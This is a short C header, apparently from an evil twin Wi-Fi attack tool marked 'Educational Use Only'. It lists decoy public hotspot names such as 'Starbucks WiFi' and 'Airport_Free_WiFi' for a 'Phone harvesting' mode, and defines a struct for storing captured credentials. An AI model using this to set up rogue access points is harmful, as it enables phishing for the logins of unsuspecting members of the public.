// Evil Twin Dual-Mode - Educational Use Only
#ifndef EVIL_TWIN_H
#define EVIL_TWIN_H

#include "config.h"

// Preset SSIDs for Mode 0 (Phone harvesting)
const char* const SSID_PRESETS[] = {
  "Free_WiFi",
  "FREE INTERNET",
  "Guest_WiFi",
  "iPhone Hotspot",
  "AndroidAP",
  "Galaxy_Hotspot",
  "Starbucks WiFi",
  "Coffee_Shop_Free",
  "Mall_Free_WiFi",
  "SM_Guest_WiFi",
  "Park_WiFi_Free",
  "Library_WiFi",
  "Airport_Free_WiFi",
  "Hotel_Guest",
  "[Custom SSID...]"
};
const int SSID_PRESET_COUNT = 15;

// Unified credential storage
struct CapturedCredential {
  String type;
  String value;
  String ssid;
  uint32_t timestamp;
};

#endif
